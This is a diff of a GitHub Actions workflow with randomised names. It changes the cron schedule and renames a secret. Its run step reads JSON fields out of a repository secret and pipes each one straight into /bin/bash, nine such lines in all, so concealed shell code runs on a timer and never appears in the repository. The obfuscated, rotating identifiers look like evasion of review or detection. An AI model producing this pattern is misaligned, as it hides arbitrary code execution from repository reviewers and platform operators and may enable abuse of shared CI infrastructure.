@@ -1,9 +1,9 @@
 name: liulinglong6510
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 5/6 * * *'
+    - cron: '18 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,16 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: liulinglong6510
         env:
-          fvy04: ${{ secrets.fvy04 }}
+          a85: ${{ secrets.a85 }}
         run: |
-          echo $fvy04 | jq -r .cr21711 | /bin/bash
-          echo $bczn31640 | jq -r .towo67386 | /bin/bash
-          echo $pti04 | jq -r .nd8969 | /bin/bash
-          echo $lefh47170 | jq -r .h478 | /bin/bash
-          echo $ew3 | jq -r .tau0740 | /bin/bash
-          echo $tfaji3 | jq -r .vdeo10 | /bin/bash
-          echo $xbgnf88 | jq -r .mptq89 | /bin/bash
-          echo $ht7 | jq -r .mna6 | /bin/bash
-          echo $dyh364 | jq -r .ozclo1575 | /bin/bash
-          echo $r80 | jq -r .kkozp3 | /bin/bash
+          echo $a85 | jq -r .qna08736 | /bin/bash
+          echo $s1627 | jq -r .smh304 | /bin/bash
+          echo $shc3269 | jq -r .m7184 | /bin/bash
+          echo $ojzh86 | jq -r .kxx46 | /bin/bash
+          echo $cbjma5166 | jq -r .zjkui87551 | /bin/bash
+          echo $m5 | jq -r .vz3 | /bin/bash
+          echo $qedl69561 | jq -r .qlu00 | /bin/bash
+          echo $l01668 | jq -r .mckm71563 | /bin/bash
+          echo $hjlcw60974 | jq -r .gmap842 | /bin/bash
 
